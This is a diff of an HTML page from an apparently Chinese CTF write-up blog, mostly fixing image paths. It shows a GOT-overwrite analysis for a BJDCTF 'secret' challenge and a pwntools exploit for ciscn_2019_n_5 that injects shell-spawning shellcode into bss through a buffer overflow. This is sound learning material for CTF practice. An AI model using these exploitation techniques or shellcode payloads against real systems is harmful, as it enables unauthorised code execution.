@@ -128,14 +128,15 @@ var _hmt = _hmt || [];
 <h2 id="2-BJDCTF-2nd-secret">2. [BJDCTF 2nd]secret</h2>
 <h3 id="分析-2">分析</h3>
 <ul>
-<li>在输入name的函数中有个溢出点<img src="/2020/05/buuoj-pwn/05/buuoj-pwn/secret_welcome.png" class>
-并且刚好只能溢出到 gameTimes（猜数计数器的指针）<img src="/2020/05/buuoj-pwn/05/buuoj-pwn/secret_overflow.png" class>
-</li>
-<li>发现每次输入secret时，gameTimes所指向的位置都会减一<img src="/2020/05/buuoj-pwn/05/buuoj-pwn/secret_gameTimedec.png" class>
-</li>
+<li>在输入name的函数中有个溢出点<br>
+<img src="/2020/05/buuoj-pwn/secret_welcome.png" alt="img"><br>
+并且刚好只能溢出到 gameTimes（猜数计数器的指针）<br>
+<img src="/2020/05/buuoj-pwn/secret_overflow.png" alt="img"></li>
+<li>发现每次输入secret时，gameTimes所指向的位置都会减一<br>
+<img src="/2020/05/buuoj-pwn/secret_gameTimedec.png" alt="img"></li>
 <li>程序结束部分会调用一次printf函数，并且printf函数至始至终只被调用了一次</li>
-<li>查看程序尚未延迟绑定时的GOT表，发现got[‘system’]指向的plt表位置，比got[‘printf’]指向的位置要低，并且只低了0x10字节<img src="/2020/05/buuoj-pwn/05/buuoj-pwn/secret_got.png" class>
-</li>
+<li>查看程序尚未延迟绑定时的GOT表，发现got[‘system’]指向的plt表位置，比got[‘printf’]指向的位置要低，并且只低了0x10字节<br>
+<img src="/2020/05/buuoj-pwn/secret_got.png" alt="img"></li>
 <li>所以我们可以通过输入name函数的溢出漏洞，修改gameTimes，使其指向got[‘printf’]。然后进行0x10次猜数，使got[‘printf’]减去0x10，指向plt[‘system’]<br>
 并在第十次猜数时故意失败，从而执行system(buf), 进行任意命令执行</li>
 </ul>
@@ -150,8 +151,8 @@ var _hmt = _hmt || [];
 <li>NX关闭，很明显的一个读取并执行shellcode的题目</li>
 <li>但这题有趣在：当NX关闭后，<strong>其bss段是可执行的</strong><br>
 粗略观察了一下内存布局，发现只要关闭了NX，<strong>所有可读可写的段</strong> 都是可执行的<br>
-以后要是有机会还是得研究一下NX的实现<img src="/2020/05/buuoj-pwn/05/buuoj-pwn/ciscn_2019_n_5_vmmap.png" class>
-</li>
+以后要是有机会还是得研究一下NX的实现<br>
+<img src="/2020/05/buuoj-pwn/ciscn_2019_n_5_vmmap.png" alt="img"></li>
 </ul>
 <h3 id="EXP-3">EXP</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./ciscn_2019_n_5"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'tell me your name'</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">payload = flat(cyclic(<span class="number">0x28</span>), <span class="number">0x601080</span>)</span><br><span class="line">io.recvuntil(<span class="string">'What do you want to say to me?'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
